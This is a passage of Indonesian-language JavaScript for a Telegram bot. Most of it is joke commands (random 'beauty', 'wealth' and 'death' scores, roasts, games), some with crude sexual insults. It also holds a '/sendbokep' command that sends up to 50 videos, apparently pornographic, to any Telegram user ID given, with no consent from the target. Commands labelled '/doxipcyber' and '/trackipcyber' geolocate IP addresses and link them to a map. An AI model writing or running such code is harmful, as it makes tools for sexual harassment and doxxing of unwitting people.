    const { data } = await axios.get(`http://ip-api.com/json/${ip}`);
    if (data.status !== "success") throw new Error("IP tidak ditemukan");

    const teks = `
🌍 *IP FOUND!*

• *IP:* ${data.query}
• *Country:* ${data.country}
• *City:* ${data.city}
• *ISP:* ${data.isp}

📍 [Lihat di Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
    `;
    await bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error: " + err.message);
  }
});

bot.onText(/^\/listharga$/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, `
<blockquote>💰 <b>DAFTAR HARGA SCRIPT BOT</b></blockquote>
Klik tombol di bawah untuk melihat harga lengkap script bot:
  `, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📄 Lihat Harga Script", callback_data: "lihat_harga" }]
      ]
    }
  });
});

// Handler tombol
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === "lihat_harga") {
    bot.sendMessage(chatId, `
<blockquote>💬 <b>SCRIPT TELE BOT</b></blockquote>
<blockquote>LIST HARGA SCRIPT ALWAYS TRI V7 G2</blockquote>
<blockquote>• FREE UPDATE 10K
• RESELLER 20K
• PARTNER 30K
• OWNER 40K
• NO ENC 50K
contack: @DanzzOficial</blockquote>
    `, { parse_mode: "HTML" });
  }

  bot.answerCallbackQuery(callbackQuery.id);
});

bot.onText(/^\/cekcantik$/, (msg) => {
  const nilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100][Math.floor(Math.random() * 14)];
  const teks = `
📊 *Hasil Tes Kecantikan*
👤 Nama: *${msg.from.first_name}*
💯 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarCantik(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Nilai dan komentar untuk kekayaan
function komentarKaya(nilai) {
  if (nilai >= 100) return "💎 Sultan auto endorse siapa aja.";
  if (nilai >= 90) return "🛥️ Jet pribadi parkir di halaman rumah.";
  if (nilai >= 80) return "🏰 Rumahnya bisa buat konser.";
  if (nilai >= 70) return "💼 Bos besar! Duit ngalir terus.";
  if (nilai >= 60) return "🤑 Kaya banget, no debat.";
  if (nilai >= 50) return "💸 Kaya, tapi masih waras.";
  if (nilai >= 40) return "💳 Lumayan lah, saldo aman.";
  if (nilai >= 30) return "🏦 Kayanya sih... dari tampang.";
  if (nilai >= 20) return "🤔 Cukup buat traktir kopi.";
  if (nilai >= 10) return "🫠 Kaya hati, bukan dompet.";
  return "🙃 Duitnya imajinasi aja kayaknya.";
}

// Nilai dan komentar untuk kemiskinan
function komentarMiskin(nilai) {
  if (nilai >= 100) return "💀 Miskin absolut, utang warisan.";
  if (nilai >= 90) return "🥹 Mau beli gorengan mikir 3x.";
  if (nilai >= 80) return "😩 Isi dompet: angin & harapan.";
  if (nilai >= 70) return "😭 Bayar parkir aja utang.";
  if (nilai >= 60) return "🫥 Pernah beli pulsa receh?";
  if (nilai >= 50) return "😬 Makan indomie aja dibagi dua.";
  if (nilai >= 40) return "😅 Listrik token 5 ribu doang.";
  if (nilai >= 30) return "😔 Sering nanya *gratis ga nih?*";
  if (nilai >= 20) return "🫣 Semoga dapet bansos.";
  if (nilai >= 10) return "🥲 Yang penting hidup.";
  return "😵 Gaji = 0, tagihan = tak terbatas.";
}

// /cekkaya
bot.onText(/^\/cekkaya$/, (msg) => {
  const nilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100][Math.floor(Math.random() * 10)];
  const teks = `
💵 *Tes Kekayaan*
👤 Nama: *${msg.from.first_name}*
💰 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarKaya(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

function komentarTampan(nilai) {
  if (nilai >= 100) return "💎 Ganteng dewa, mustahil diciptakan ulang.";
  if (nilai >= 94) return "🔥 Ganteng gila! Mirip artis Korea!";
  if (nilai >= 90) return "😎 Bintang iklan skincare!";
  if (nilai >= 83) return "✨ Wajahmu memantulkan sinar kebahagiaan.";
  if (nilai >= 78) return "🧼 Bersih dan rapih, cocok jadi influencer!";
  if (nilai >= 73) return "🆒 Ganteng natural, no filter!";
  if (nilai >= 68) return "😉 Banyak yang naksir nih kayaknya.";
  if (nilai >= 54) return "🙂 Lumayan sih... asal jangan senyum terus.";
  if (nilai >= 50) return "😐 Gantengnya malu-malu.";
  if (nilai >= 45) return "😬 Masih bisa lah asal percaya diri.";
  if (nilai >= 35) return "🤔 Hmm... mungkin bukan harinya.";
  if (nilai >= 30) return "🫥 Sedikit upgrade skincare boleh tuh.";
  if (nilai >= 20) return "🫣 Coba pose dari sudut lain?";
  if (nilai >= 10) return "😭 Yang penting akhlaknya ya...";
  return "😵 Gagal di wajah, semoga menang di hati.";
}

function komentarCantik(nilai) {
  if (nilai >= 100) return "👑 Cantiknya level dewi Olympus!";
  if (nilai >= 94) return "🌟 Glowing parah! Bikin semua iri!";
  if (nilai >= 90) return "💃 Jalan aja kayak jalan di runway!";
  if (nilai >= 83) return "✨ Inner & outer beauty combo!";
  if (nilai >= 78) return "💅 Cantik ala aesthetic tiktok!";
  if (nilai >= 73) return "😊 Manis dan mempesona!";
  if (nilai >= 68) return "😍 Bisa jadi idol nih!";
  if (nilai >= 54) return "😌 Cantik-cantik adem.";
  if (nilai >= 50) return "😐 Masih oke, tapi bisa lebih wow.";
  if (nilai >= 45) return "😬 Coba lighting lebih terang deh.";
  if (nilai >= 35) return "🤔 Unik sih... kayak seni modern.";
  if (nilai >= 30) return "🫥 Banyak yang lebih butuh makeup.";
  if (nilai >= 20) return "🫣 Mungkin inner beauty aja ya.";
  if (nilai >= 10) return "😭 Cinta itu buta kok.";
  return "😵 Semoga kamu lucu pas bayi.";
}
function komentarSabar(nilai) {
  if (nilai >= 100) return "🌟 Wah, kamu luar biasa sabar dan hebat!";
  if (nilai >= 94) return "👍 Tetap sabar, kesuksesan sudah dekat.";
  if (nilai >= 90) return "😊 Sabar itu kunci, terus semangat ya!";
  if (nilai >= 83) return "💪 Kamu kuat, sabar sedikit lagi.";
  if (nilai >= 78) return "🌱 Sabar tumbuh jadi kekuatan.";
  if (nilai >= 73) return "✨ Jangan lelah bersabar, hasilnya manis.";
  if (nilai >= 68) return "🧘‍♂️ Tenang, sabar membawa kedamaian.";
  if (nilai >= 54) return "🌸 Sabar itu indah, teruslah berusaha.";
  if (nilai >= 50) return "🌈 Percaya deh, sabar ada hadiahnya.";
  if (nilai >= 45) return "☀️ Sabar sedikit lagi, kamu pasti bisa.";
  if (nilai >= 35) return "🌻 Jangan putus asa, sabar selalu membantu.";
  if (nilai >= 30) return "🕊️ Sabar itu pelajaran berharga.";
  if (nilai >= 20) return "🌿 Terus sabar ya, jangan menyerah.";
  if (nilai >= 10) return "🤲 Sedikit sabar, banyak berkah.";
  return "🙏 Sabar ya, setiap ujian ada hikmahnya.";
}

// LIST ROAST
const roastList = [
  "Eh elu jomblo ya? wkwk kasian amat",
  "Yah lu ga skolah, belajar dlu Sono yang pinter",
  "Lu bego? wwkkwkw jangan bego yah kasian",
  "Ngaku dev padahal masih Rinem 😹.",
  "nggak jelek kok, cuma kamera yang menyerah.",
  "kalo ada lomba bengong, kamu juara umum.",
  "versi manusia dari 'internal error'.",
  "kamu tuh bukan malas, cuma hemat energi dunia."
];

// /roastme <target>
bot.onText(/\/roastme(?:\s+(.*))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1]; // nama atau mention setelah /roastme

  // Pilih roast random
  const roast = roastList[Math.floor(Math.random() * roastList.length)];

  if (!target) {
    // Kalau tidak ada target, roast pengirim
    return bot.sendMessage(
      chatId,
      `🔥 *Roast buat kamu!*\n\n${roast}`,
      { parse_mode: "Markdown" }
    );
  }

  // Ada target
  bot.sendMessage(
    chatId,
    `🔥 *Roast untuk ${target}*\n\n${roast}`,
    { parse_mode: "Markdown" }
  );
});

function komentarTolol(nilai) {
  if (nilai >= 100) return "🤪 Wah, level tololmu sudah master, salut!";
  if (nilai >= 94) return "😂 Udah pinter, tapi masih suka kocak.";
  if (nilai >= 90) return "😜 Kreatif banget, tolol yang menghibur!";
  if (nilai >= 83) return "😅 Santai aja, semua orang kadang tolol.";
  if (nilai >= 78) return "😆 Lumayan kocak, jangan berubah ya.";
  if (nilai >= 73) return "😉 Tolol tapi charming, kombinasi keren.";
  if (nilai >= 68) return "😎 Asal jangan kebanyakan mikir, santuy.";
  if (nilai >= 54) return "🤭 Jangan sedih, tolol itu manusiawi.";
  if (nilai >= 50) return "🙂 Santuy, semua ada waktunya.";
  if (nilai >= 45) return "😬 Masih wajar kok, jangan dipikirin.";
  if (nilai >= 35) return "🤔 Kadang tolol itu bikin lucu, ya kan?";
  if (nilai >= 30) return "😴 Santai, jangan terlalu serius.";
  if (nilai >= 20) return "😐 Bisa jadi tolol pintar, coba terus.";
  if (nilai >= 10) return "🙃 Hidup terlalu singkat buat terlalu serius.";
  return "😵 Wah, kamu jago banget jadi tolol, jangan berubah!";
}

function komentarMati(nilai) {
  if (nilai >= 100) return "💀 1 tahun lagi, kamu bakal jadi legenda!";
  if (nilai >= 94) return "☠️ 5 tahun lagi, siap-siap jadi juara!";
  if (nilai >= 90) return "🪦 10 tahun lagi, perjalanan masih panjang.";
  if (nilai >= 83) return "😵 15 tahun lagi, jangan berhenti berusaha.";
  if (nilai >= 78) return "🦴 20 tahun lagi, kesabaranmu diuji.";
  if (nilai >= 73) return "⚰️ 25 tahun lagi, semangat terus ya!";
  if (nilai >= 68) return "🕯️ 30 tahun lagi, jangan patah semangat.";
  if (nilai >= 54) return "🪦 40 tahun lagi, masih banyak waktu buat berkarya.";
  if (nilai >= 50) return "💤 50 tahun lagi, tetap jaga kesehatan dan mimpi.";
  if (nilai >= 45) return "🛌 60 tahun lagi, santai tapi jangan malas.";
  if (nilai >= 35) return "🌫️ 70 tahun lagi, teruslah berjuang.";
  if (nilai >= 30) return "😶‍🌫️ 80 tahun lagi, perjalanan panjang menanti.";
  if (nilai >= 20) return "🌙 90 tahun lagi, semangat terus hidupnya!";
  if (nilai >= 10) return "🌑 100 tahun lagi, kamu bakal jadi legenda abadi.";
  return "🌌 Lebih dari 100 tahun lagi, perjalananmu baru mulai.";
}

bot.onText(/^\/ceksabar$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  const nilai = Math.floor(Math.random() * 101);
  const teks = `<blockquote>💕 HASIL TES KESABARAN
👤 Nama: ${msg.from.first_name}
📊 Nilai: ${nilai}%
🗣️ Komentar: ${komentarSabar(nilai)}
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
});

bot.onText(/^\/cektolol$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  

  const nilai = Math.floor(Math.random() * 101);
  const teks = `<blockquote>💕 HASIL TES KETOLOLAN
👤 Nama: ${msg.from.first_name}
📊 Nilai: ${nilai}%
🗣️ Komentar: ${komentarTolol(nilai)}
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
});

bot.onText(/^\/cekmati$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  const nilai = Math.floor(Math.random() * 101);
  const teks = `<blockquote>💕 HASIL TES KETOLOLAN
👤 Nama: ${msg.from.first_name}
📊 Nilai: ${nilai}%
🗣️ Komentar: ${komentarMati(nilai)}
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
});

bot.onText(/^\/cektampan$/, (msg) => {
  const nilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100][Math.floor(Math.random() * 14)];
  const teks = `
📊 *Hasil Tes Ketampanan*
👤 Nama: *${msg.from.first_name}*
💯 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarTampan(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

bot.onText(/^\/cekmiskin$/, (msg) => {
  const nilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100][Math.floor(Math.random() * 10)];
  const teks = `
📉 *Tes Kemiskinan*
👤 Nama: *${msg.from.first_name}*
📉 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarMiskin(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Fungsi komentar berdasarkan skor
function komentarJanda(nilai) {
  if (nilai >= 100) return "🔥 Janda premium, banyak yang ngantri.";
  if (nilai >= 90) return "💋 Bekas tapi masih segel.";
  if (nilai >= 80) return "🛵 Banyak yang ngajak balikan.";
  if (nilai >= 70) return "🌶️ Janda beranak dua, laku keras.";
  if (nilai >= 60) return "🧕 Pernah disakiti, sekarang bersinar.";
  if (nilai >= 50) return "🪞 Masih suka upload status galau.";
  if (nilai >= 40) return "🧍‍♀️ Janda low-profile.";
  if (nilai >= 30) return "💔 Ditinggal pas lagi sayang-sayangnya.";
  if (nilai >= 20) return "🫥 Baru ditinggal, masih labil.";
  if (nilai >= 10) return "🥲 Janda lokal, perlu support moral.";
  return "🚫 Masih istri orang, bro.";
}

// /cekjanda
bot.onText(/^\/cekjanda$/, (msg) => {
  const nilai = Math.floor(Math.random() * 101); // 0 - 100
  const teks = `
👠 *Tes Kejandaan*
👤 Nama: *${msg.from.first_name}*
📊 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarJanda(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Fungsi komentar sesuai skor pacar
function komentarPacar(nilai) {
  if (nilai >= 95) return "💍 Sudah tunangan, tinggal nikah.";
  if (nilai >= 85) return "❤️ Pacaran sehat, udah 3 tahun lebih.";
  if (nilai >= 70) return "😍 Lagi anget-angetnya.";
  if (nilai >= 60) return "😘 Sering video call tiap malam.";
  if (nilai >= 50) return "🫶 Saling sayang, tapi LDR.";
  if (nilai >= 40) return "😶 Dibilang pacaran, belum tentu. Tapi dibilang nggak, juga iya.";
  if (nilai >= 30) return "😅 Masih PDKT, nunggu sinyal.";
  if (nilai >= 20) return "🥲 Sering ngechat, tapi dicuekin.";
  if (nilai >= 10) return "🫠 Naksir diam-diam.";
  return "❌ Jomblo murni, nggak ada harapan sementara ini.";
}

// TEMPAT SIMPAN JAWABAN
const tebakMath = {};

// COMMAND /tebakmat
bot.onText(/\/tebakmat/, async (msg) => {
  const chatId = msg.chat.id;

  // Angka random 1–10
  const a = Math.floor(Math.random() * 10) + 1;
  const b = Math.floor(Math.random() * 10) + 1;

  // Operator random
  const ops = ["+", "-", "×"];
  const op = ops[Math.floor(Math.random() * ops.length)];

  // Hitung hasil
  let hasil =
    op === "+" ? a + b :
    op === "-" ? a - b :
    a * b;

  // Simpan jawaban user
  tebakMath[chatId] = hasil.toString();

  bot.sendMessage(
    chatId,
    `🧮 *Tebak Matematika!*\n\nBerapa hasil dari:\n\n*${a} ${op} ${b} = ?*`,
    { parse_mode: "Markdown" }
  );
});

// CEK JAWABAN
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text?.trim();

  // Bukan sesi tebakan → skip
  if (!tebakMath[chatId]) return;

  // Kalau user jawab dengan command lain → skip
  if (text.startsWith("/")) return;

  const jawabanBenar = tebakMath[chatId];

  // Harus angka
  if (isNaN(text)) {
    return bot.sendMessage(chatId, "Ketik angka ya, bukan teks.");
  }

  if (text === jawabanBenar) {
    bot.sendMessage(chatId, "🎉 *Benar!* Kamu mantap!", {
      parse_mode: "Markdown",
    });
  } else {
    bot.sendMessage(chatId, `❌ Salah!\nYang benar: *${jawabanBenar}*`, {
      parse_mode: "Markdown",
    });
  }

  // Hapus setelah dijawab
  delete tebakMath[chatId];
});

bot.onText(/\/ramalnasib/, (msg) => {
  const chatId = msg.chat.id;

  const ramalan = [
    "Hari ini kamu akan ketemu keberuntungan kecil. Jangan lewatkan!",
    "Waspada… ada orang yang diam-diam kepoin kamu.",
    "Uangmu aman… kalau kamu nggak keluar rumah.",
    "Ada yang kangen kamu, tapi gengsi bilang.",
    "Kamu harus tidur lebih awal, semesta sudah protes."
  ];

  const pilih = ramalan[Math.floor(Math.random() * ramalan.length)];

  bot.sendMessage(chatId, `🔮 *Ramalan Nasib Kamu*\n\n${pilih}`, {
    parse_mode: "Markdown"
  });
});

bot.onText(/\/dramaku/, async (msg) => {
  const chatId = msg.chat.id;

  const drama = [
    "Kamu ditinggal pas lagi sayang-sayangnya.",
    "Dia bilang 'aku sibuk', padahal sibuk sama yang lain.",
    "Kamu chat panjang, dia bales 'oh'.",
    "Dia bilang gak punya waktu, tapi story selalu update.",
    "Kamu udah niat serius, dia malah balik ke mantannya.",
    "Tiba-tiba dia bilang, 'kita lebih baik temenan aja'.",
    "Kamu perjuangin dia, dia perjuangin orang lain.",
    "Kemarin dia bilang sayang, hari ini pura-pura lupa.",
    "Kamu yang susah payah ngejar, dia yang gampang berpaling.",
    "Kamu cuma minta kejelasan, dia malah hilang."
  ];

  const text = drama[Math.floor(Math.random() * drama.length)];

  bot.sendMessage(chatId, `🎭 *Drama Hari Ini*\n\n${text}`, { parse_mode: "Markdown" });
});

bot.onText(/\/cekmasadepan/, async (msg) => {
  const chatId = msg.chat.id;

  const future = [
    "3 hari lagi kamu dapat kabar yang bikin senyum.",
    "2 minggu lagi kamu ketemu orang yang bakal ngubah hidup kamu.",
    "Besok keberuntungan bakal mampir ke kamu.",
    "7 hari lagi kamu dapat kesempatan besar.",
    "Dalam 48 jam kamu bakal dapet pesan penting.",
    "Sebentar lagi ada orang yang merindukan kamu datang lagi.",
    "Bulan depan hidup kamu lebih teratur.",
    "Dalam waktu dekat kamu dapet hal yang kamu impikan.",
    "Kamu akan menerima rezeki tak terduga dalam 5 hari.",
    "Waktu akan membawa kamu ke sesuatu yang lebih baik."
  ];

  const text = future[Math.floor(Math.random() * future.length)];

  bot.sendMessage(chatId, `🛸 *Time Travel Report*\n\n${text}`, { parse_mode: "Markdown" });
});

bot.onText(/\/slot/, async (msg) => {
  const chatId = msg.chat.id;

  const simbol = ["🍒", "🍇", "💎", "🍋", "⭐", "🔥"];
  
  const s1 = simbol[Math.floor(Math.random() * simbol.length)];
  const s2 = simbol[Math.floor(Math.random() * simbol.length)];
  const s3 = simbol[Math.floor(Math.random() * simbol.length)];

  let hasil;
  if (s1 === s2 && s2 === s3) {
    hasil = "🎉 JACKPOT! Kamu menang!";
  } else {
    hasil = "😢 Yah, belum hoki.";
  }

  bot.sendMessage(chatId, `🎰 *Slot Mania*\n\n${s1} | ${s2} | ${s3}\n\n${hasil}`, {
    parse_mode: "Markdown"
  });
});

bot.onText(/\/info (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];

  const scan = [
    `${target} terdeteksi suka mabar jam 2 pagi.`,
    `${target} terdeteksi sering chatting tapi gak dibales.`,
    `${target} punya potensi jadi orang sukses… kalau gak rebahan.`,
    `${target} akhir-akhir ini kepikiran seseorang.`,
    `${target} butuh liburan tapi dompet tidak mendukung.`
  ];

  const pilih = scan[Math.floor(Math.random() * scan.length)];

  bot.sendMessage(chatId, `🕵️ *Scanning...*\n\n${pilih}`, {
    parse_mode: "Markdown"
  });
});

bot.onText(/\/gombalin/, (msg) => {
  const chatId = msg.chat.id;

  const list = [
    "Kamu tau bedanya bumi sama kamu? … Kalau bumi itu bulat, kalo kamu itu lengkapin hidup aku ❤️",
    "Kalau kamu pelajaran sekolah, aku rela ga bolos lagi.",
    "Neng… kalau senyum jangan lama-lama, aku takut jatuh lagi.",
    "Kamu itu WIFI ya? Soalnya aku ngerasa konek sama kamu."
  ];

  bot.sendMessage(chatId, `💘 *Gombalan Hari Ini:*\n${list[Math.floor(Math.random() * list.length)]}`);
});

// Command
bot.onText(/^\/cekpacar$/, (msg) => {
  const nilai = Math.floor(Math.random() * 101); // nilai 0-100
  const teks = `
💕 *Tes Kepacaran*
👤 Nama: *${msg.from.first_name}*
📊 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarPacar(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

bot.onText(/^\/cekkhodam(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = (match[1] || '').trim();

  if (!nama) {
    return bot.sendMessage(chatId, 'ɴᴀᴍᴀɴʏᴀ ᴍᴀɴᴀ ᴀɴᴊᴇɴɢ🤓');
  }

  const khodamList = [
    'si ganteng',
    'si jelek',
    'anomali bt script',
    'kang hapus sumber',
    'maling pulpen', 
    'kak gem', 
    'suster ngesot', 
    'kang ngocok',
    'Anomali maklu',
    'orang gila',
    'anak rajin',
    'jadi lc', 
    'suka ngentot tiap hari', 
    'tukang caper',
    'anak cerdas',
    'lonte gurun',
    'dugong',
    'macan yatim',
    'buaya darat',
    'kanjut terbang',
    'kuda kayang',
    'janda salto',
    'lonte alas',
    'jembut singa',
    'gajah terbang',
    'kuda cacat',
    'jembut pink',
    'sabun bolong',
    'ambalambu',
    'megawati',
    'jokowi', 
    'polisi', 
    'sempak bolong', 
    'bh bolong',
  ];

  const pickRandom = (list) => list[Math.floor(Math.random() * list.length)];

  const hasil = `
<blockquote><b>𖤐 ʜᴀsɪʟ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ:</b>
╭───────────────────
├ •ɴᴀᴍᴀ : ${nama}
├ •ᴋʜᴏᴅᴀᴍɴʏᴀ : ${pickRandom(khodamList)}
├ •ɴɢᴇʀɪ ʙᴇᴛ ᴊɪʀ ᴋʜᴏᴅᴀᴍɴʏᴀ
╰───────────────────
<b>ɴᴇxᴛ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍɴʏᴀ sɪᴀᴘᴀ ʟᴀɢɪ.</b>
</blockquote>
  `;

  bot.sendMessage(chatId, hasil, { parse_mode: 'HTML' });
});

const videoList = [
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4",
  "https://files.catbox.moe/zjo5r6.mp4",
  "https://files.catbox.moe/7i6amv.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4",
  "https://files.catbox.moe/fxe94h.mp4",
  "https://files.catbox.moe/52oh63.mp4",
  "https://files.catbox.moe/ite58a.mp4",
  "https://files.catbox.moe/svw26n.mp4",
  "https://files.catbox.moe/bv5yaa.mp4",
  "https://files.catbox.moe/ozk5xr.mp4",
  "https://files.catbox.moe/926k9a.mp4"
];

let lastVideoIndex = -1;

function pickRandomVideo() {
  let i;
  do {
    i = Math.floor(Math.random() * videoList.length);
  } while (i === lastVideoIndex && videoList.length > 1);

  lastVideoIndex = i;
  return videoList[i];
}

// --- Command: /sendbokep <telegram_id> <jumlah_video> ---
bot.onText(/\/sendbokep\s+(\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetId = match[1];
  let jumlahVideo = parseInt(match[2]) || Math.floor(Math.random() * 50) + 1;

  // Batasi jumlah video max 50
  if (jumlahVideo > 50) jumlahVideo = 50;

  let waitingMsg = await bot.sendMessage(
    chatId,
    `🔍 Memeriksa pengguna dan mengirim ${jumlahVideo} video...`,
    { parse_mode: "Markdown" }
  );

  try {
    // Buat salinan videoList agar tidak duplikat dalam batch
    const videosCopy = [...videoList];

    for (let i = 0; i < jumlahVideo; i++) {
      if (videosCopy.length === 0) break; // habis video

      // Ambil index random dari array copy
      const index = Math.floor(Math.random() * videosCopy.length);
      const videoUrl = videosCopy.splice(index, 1)[0]; // ambil dan hapus dari array

      await bot.sendVideo(targetId, videoUrl, {
        caption: `📹 Video random #${i + 1}`,
      });

      // Delay agar tidak spam
      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    await bot.editMessageText(
      `✅ *Sukses terkirim ke:* \`${targetId}\` (${jumlahVideo} video)`,
      {
        chat_id: chatId,
        message_id: waitingMsg.message_id,
        parse_mode: "Markdown",
      }
    );

  } catch (err) {
    await bot.editMessageText(
      `❌ *Gagal mengirim:* ${err.message}`,
      {
        chat_id: chatId,
        message_id: waitingMsg.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

// Jika format salah
bot.onText(/\/sendbokep$/, (msg) => {
  bot.sendMessage(msg.chat.id, "Format benar:\n/sendbokep <id_telegram> <jumlah_video (opsional, max 50)>");
});

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `©ɴᴇᴏɴ ɢʜᴏsᴛ ғᴏʀ ʏᴏᴜ`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.onText(/\/katakata/, async (msg) => {
  const chatId = msg.chat.id;

  const kataSakit = [
    "Kadang yang paling kita jaga, justru yang paling tega ninggalin.",
    "Aku ga marah, cuma kecewa… karena ternyata doa aku ga sekuat luka yang kamu kasih.",
    "Lucu ya, aku sayang setulus itu, tapi kamu pergi segampang itu.",
    "Aku cuma butuh dipertahanin, bukan ditinggal pas lagi sayang-sayangnya.",
    "Aku kehilangan diriku sendiri waktu ngejar orang yang ga mau berhenti.",
    "Sakit itu waktu kamu mulai biasa, padahal dulu kamu yang bikin aku terbiasa.",
    "Maaf ya, aku capek kelihatan kuat.",
    "Ternyata yang bikin hancur bukan kehilangan, tapi caramu pergi.",
    "Aku berjuang sendirian, kamu malah sibuk cari pelarian.",
    "Kalau kamu bahagia tanpa aku, mau gimana lagi… aku cuma bisa ngikhlasin."
  ];

  const random = kataSakit[Math.floor(Math.random() * kataSakit.length)];

  bot.sendMessage(chatId, `💔 *Kata-Kata Random:*\n\n${random}`, {
    parse_mode: "Markdown"
  });
});

bot.onText(/^\/(trackipcyber|doxipcyber)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const command = match[1];
  const ip = match[2]?.trim(); // bisa kosong

  try {
    // kalau ip kosong, ambil IP publik si user
    const targetIP = ip || (await axios.get("https://api.ipify.org?format=json")).data.ip;

    await bot.sendMessage(chatId, `🌍 Mengecek informasi IP *${targetIP}*...`, {
      parse_mode: "Markdown",
    });

    // Ambil data IP dari ipwho.is
    const { data: res } = await axios.get(`https://ipwho.is/${targetIP}`);

    if (!res.success) {
